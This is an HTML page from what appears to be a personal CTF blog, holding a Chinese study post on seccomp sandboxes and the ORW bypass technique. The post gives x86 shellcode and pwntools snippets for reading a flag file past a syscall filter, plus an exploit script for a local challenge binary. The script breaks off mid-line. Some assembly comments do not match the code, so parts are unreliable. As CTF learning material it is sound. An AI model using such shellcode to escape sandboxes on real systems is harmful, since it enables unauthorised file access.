@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="sandbox专题学习刚刚学完栈迁移📚，发现 sandbox 🧱经常和栈迁移结合，于是就仔细学一下 sandbox 🤓！ 💻 Sandbox绕过好像很多，也复杂 😤，这里只好记录一下ORW的学习 📝 orw什么时候用orw当程序开启沙箱保护，禁用一些系统调用，禁用execve等，使得我们不能通过使用system和execve来getshell。此时我们就要用到orw来解决这些问题。 o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sandbox专题学习">
+<meta property="og:url" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="sandbox专题学习刚刚学完栈迁移📚，发现 sandbox 🧱经常和栈迁移结合，于是就仔细学一下 sandbox 🤓！ 💻 Sandbox绕过好像很多，也复杂 😤，这里只好记录一下ORW的学习 📝 orw什么时候用orw当程序开启沙箱保护，禁用一些系统调用，禁用execve等，使得我们不能通过使用system和execve来getshell。此时我们就要用到orw来解决这些问题。 o">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png">
+<meta property="article:published_time" content="2025-06-29T11:48:09.000Z">
+<meta property="article:modified_time" content="2025-09-23T13:01:06.850Z">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png">
+
+<link rel="canonical" href="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sandbox专题学习 | 网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sandbox专题学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-29 19:48:09" itemprop="dateCreated datePublished" datetime="2025-06-29T19:48:09+08:00">2025-06-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-09-23 21:01:06" itemprop="dateModified" datetime="2025-09-23T21:01:06+08:00">2025-09-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/sandbox/" itemprop="url" rel="index"><span itemprop="name">sandbox</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="sandbox专题学习"><a href="#sandbox专题学习" class="headerlink" title="sandbox专题学习"></a>sandbox专题学习</h2><p>刚刚学完栈迁移📚，发现 sandbox 🧱经常和栈迁移结合，于是就仔细学一下 sandbox 🤓！</p>
+<p>💻 Sandbox绕过好像很多，也复杂 😤，这里只好记录一下ORW的学习 📝</p>
+<h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><h4 id="什么时候用orw"><a href="#什么时候用orw" class="headerlink" title="什么时候用orw"></a>什么时候用orw</h4><p>当程序开启沙箱保护，禁用一些系统调用，禁用execve等，使得我们不能通过使用system和execve来getshell。此时我们就要用到orw来解决这些问题。</p>
+<h4 id="orw是什么"><a href="#orw是什么" class="headerlink" title="orw是什么"></a>orw是什么</h4><p>orw就是open,read,write这三个函数的简写，打开flag,读取flag,写出flag通过这三步来得到flag。</p>
+<h4 id="sandbox的开启"><a href="#sandbox的开启" class="headerlink" title="sandbox的开启"></a>sandbox的开启</h4><p>第一种是利用prctl(),第二种是利用seccomp的库函数</p>
+<p>(1) prctl():</p>
+<p>在 Linux 系统编程中，<code>prctl</code> 函数结合 <code>PR_SET_SECCOMP</code> 或 <code>PR_SET_NO_NEW_PRIVS</code> 标志可用于开启 <strong>seccomp（Secure Computing）沙箱</strong>，这是一种限制进程系统调用（syscall）的安全机制。</p>
+<p>PR_SET_NO_NEW_PRIVS:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); #禁止进程及其子进程通过 execve 等获得新权限</span><br></pre></td></tr></table></figure>
+
+<p>PR_SET_SECCOMP:</p>
+<p>严格模式<strong>（<code>SECCOMP_MODE_STRICT</code>）</strong>：仅允许 <code>read</code>, <code>write</code>, <code>_exit</code>, <code>sigreturn</code> 四个系统调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);</span><br></pre></td></tr></table></figure>
+
+<p>过滤器模式（<code>SECCOMP_MODE_FILTER</code>）：自定义允许&#x2F;拒绝的系统调用列表（通过 BPF 规则）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct sock_fprog filter = &#123; ... &#125;;  // 定义 BPF 过滤器</span><br><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;filter);</span><br></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统调用号是否在允许列表</span></span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="number">0</span>, <span class="number">1</span>), <span class="comment">// 允许 openat</span></span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, <span class="number">0</span>, <span class="number">1</span>),   <span class="comment">// 允许 read</span></span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),            <span class="comment">// 拒绝其他</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter,</span><br><span class="line">&#125;;   </span><br><span class="line"><span class="comment">//SECCOMP_RET_ALLOW：允许系统调用。</span></span><br><span class="line"><span class="comment">//SECCOMP_RET_KILL：立即终止进程。</span></span><br></pre></td></tr></table></figure>
+
+<p>(2)seccomp的库函数:例如libseccomp 库</p>
+<p>例子：仅允许进程执行 <code>exit_group</code>、<code>read</code>、<code>write</code> 系统调用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line">scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); <span class="comment">// 默认拒绝所有</span></span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">seccomp_load(ctx); <span class="comment">// 加载到内核</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>了解完这些，就开始学习如何解决它了(orw)</p>
+<h4 id="seccomp-tools查看沙箱"><a href="#seccomp-tools查看沙箱" class="headerlink" title="seccomp-tools查看沙箱"></a>seccomp-tools查看沙箱</h4><p>seccomp-tools可以用来查看沙箱的情况</p>
+<p>安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">seccomp-tools dump ./elf  #elf换成你自己的文件名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png" alt="1"></p>
+<p>可以看到那些函数是可以用的。</p>
+<h3 id="open、read、write函数的了解"><a href="#open、read、write函数的了解" class="headerlink" title="open、read、write函数的了解"></a>open、read、write函数的了解</h3><p>open()函数：</p>
+<p>函数原型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><code>pathname</code></p>
+<p>：</p>
+<ul>
+<li>文件路径名（字符串），例如：<code>&quot;flag&quot;</code>、<code>&quot;/tmp/test.txt&quot;</code>。</li>
+</ul>
+</li>
+<li><p><code>flags</code></p>
+<p>：</p>
+<ul>
+<li>打开文件的方式，比如只读、只写、读写等。</li>
+<li>可以组合多个标志（使用按位或 <code>|</code> 操作符）。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>标志常量</th>
+<th>十六进制值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>O_RDONLY</code></td>
+<td>0x0</td>
+<td>只读方式打开文件</td>
+</tr>
+<tr>
+<td><code>O_WRONLY</code></td>
+<td>0x1</td>
+<td>只写方式打开文件</td>
+</tr>
+<tr>
+<td><code>O_RDWR</code></td>
+<td>0x2</td>
+<td>读写方式打开文件</td>
+</tr>
+</tbody></table>
+<p>系统调用号：</p>
+<ul>
+<li><code>sys_open</code> 的系统调用号是 <code>5</code>（十进制），即 <code>0x5</code>。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>函数名</td>
+<td><code>open()</code></td>
+</tr>
+<tr>
+<td>功能</td>
+<td>打开或创建文件</td>
+</tr>
+<tr>
+<td>返回值</td>
+<td>文件描述符（成功）或 -1（失败）</td>
+</tr>
+<tr>
+<td>常用 flag</td>
+<td><code>O_RDONLY</code>, <code>O_WRONLY</code>, <code>O_RDWR</code>, <code>O_CREAT</code>, <code>O_TRUNC</code>, <code>O_APPEND</code></td>
+</tr>
+<tr>
+<td>mode 参数</td>
+<td>用于指定新文件权限，如 <code>0644</code></td>
+</tr>
+<tr>
+<td>系统调用号</td>
+<td><code>5</code>（Linux x86）</td>
+</tr>
+<tr>
+<td>寄存器传参</td>
+<td><code>eax=5</code>, <code>ebx=filename</code>, <code>ecx=flags</code>, <code>edx=mode</code></td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<p>read()函数：</p>
+<p>函数原型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数名</th>
+<th>类型</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>fd</code></td>
+<td><code>int</code></td>
+<td>文件描述符（由 <code>open()</code> 或其他方式获得）</td>
+</tr>
+<tr>
+<td><code>buf</code></td>
+<td><code>void*</code></td>
+<td>用户空间的缓冲区地址，用来保存读取的数据</td>
+</tr>
+<tr>
+<td><code>count</code></td>
+<td><code>size_t</code></td>
+<td>要读取的最大字节数</td>
+</tr>
+</tbody></table>
+<p>系统调用号：</p>
+<ul>
+<li><code>sys_read</code> 的系统调用号是 <code>3</code>（十进制），即 <code>0x3</code>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">寄存器传参方式（Linux x86）：</span><br><span class="line">寄存器	对应参数</span><br><span class="line">eax	系统调用号：3</span><br><span class="line">ebx	文件描述符 fd</span><br><span class="line">ecx	缓冲区地址 buf</span><br><span class="line">edx	要读取的字节数 count</span><br></pre></td></tr></table></figure>
+
+<p>write()函数:</p>
+<p>函数原型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数名</th>
+<th>类型</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>fd</code></td>
+<td><code>int</code></td>
+<td>文件描述符（由 <code>open()</code> 或其他方式获得）</td>
+</tr>
+<tr>
+<td><code>buf</code></td>
+<td><code>const void*</code></td>
+<td>用户空间的缓冲区地址，包含要写入的数据</td>
+</tr>
+<tr>
+<td><code>count</code></td>
+<td><code>size_t</code></td>
+<td>要写入的最大字节数</td>
+</tr>
+</tbody></table>
+<p>系统调用号：</p>
+<ul>
+<li><code>sys_write</code> 的系统调用号是 <code>4</code>（十进制），即 <code>0x4</code>。</li>
+</ul>
+<p>寄存器传参方式（Linux x86）：</p>
+<table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>对应参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>eax</code></td>
+<td>系统调用号：<code>4</code></td>
+</tr>
+<tr>
+<td><code>ebx</code></td>
+<td>文件描述符 <code>fd</code></td>
+</tr>
+<tr>
+<td><code>ecx</code></td>
+<td>缓冲区地址 <code>buf</code></td>
+</tr>
+<tr>
+<td><code>edx</code></td>
+<td>要写入的字节数 <code>count</code></td>
+</tr>
+</tbody></table>
+<h4 id="做完了铺垫，现在就开始orw"><a href="#做完了铺垫，现在就开始orw" class="headerlink" title="做完了铺垫，现在就开始orw"></a>做完了铺垫，现在就开始orw</h4><h5 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h5><p>首先,看看最简单的orw,在没有开启NX的条件下，可以直接写入这三个函数执行。</p>
+<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png" alt="2"></p>
+<p>第一种直接用汇编写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#0x67616c66根据文件名改动 0x67616c66转ASCII--&gt;flag</span><br><span class="line">shellcode=asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>具体解释一下这个汇编代码,根据上面对open，read，write函数的了解，汇编也就很好理解了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#fd = open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">push 0x0               ; 将0压栈，表示以只读方式打开文件（O_RDONLY）</span><br><span class="line">push 0x67616c66        ; 将&quot;flag&quot;字符串的ASCII值压栈（注意字节顺序是反的，实际上是&#x27;flag&#x27;）</span><br><span class="line">mov ebx, esp           ; 将栈顶指针赋值给ebx，作为文件名指针</span><br><span class="line">xor ecx, ecx           ; 清空ecx寄存器（第二个参数，O_RDONLY）</span><br><span class="line">xor edx, edx           ; 清空edx寄存器（第三个参数，权限模式，这里不需要）</span><br><span class="line">mov eax, 0x5           ; 调用sys_open (系统调用号5)</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0x3           ; 调用sys_read (系统调用号3)</span><br><span class="line">mov ecx, ebx           ; 文件描述符（由上一步返回值在ebx中）</span><br><span class="line">xor ebx, ebx           ; 清空ebx，作为文件描述符0（标准输入）</span><br><span class="line">mov edx, 0x100         ; 读取长度为256字节</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0x4           ; 调用sys_write (系统调用号4)</span><br><span class="line">xor ebx, ebx           ; 清空ebx，作为文件描述符1（标准输出）</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>
+
+<p>还可以通过传参传入flag的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fd = open(&#x27;home/pwn/flag&#x27;,0) 0x804a094根据具体情况而定</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;&#x27; xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read(fd,0x804a094,0x20) </span></span><br><span class="line">s += <span class="string">&#x27;&#x27;&#x27; mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write(1,0x804a094,0x20) </span></span><br><span class="line">s += <span class="string">&#x27;&#x27;&#x27; mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(s)+<span class="string">b&#x27;/home/pwn/flag\x00&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>第二种直接利用pwntools</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)        <span class="comment"># Open &#x27;flag&#x27; (fd returned in EAX)</span></span><br><span class="line">payload += shellcraft.read(<span class="number">3</span>, <span class="number">0x804a090</span>, <span class="number">0x100</span>)  <span class="comment"># Read from opened FD</span></span><br><span class="line">payload += shellcraft.write(<span class="number">1</span>, <span class="number">0x804a090</span>, <span class="number">0x100</span>)     <span class="comment"># Write to stdout (FD 1)</span></span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line"><span class="comment">#不知道为什么没打通理论上是可以的</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png" alt="2"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 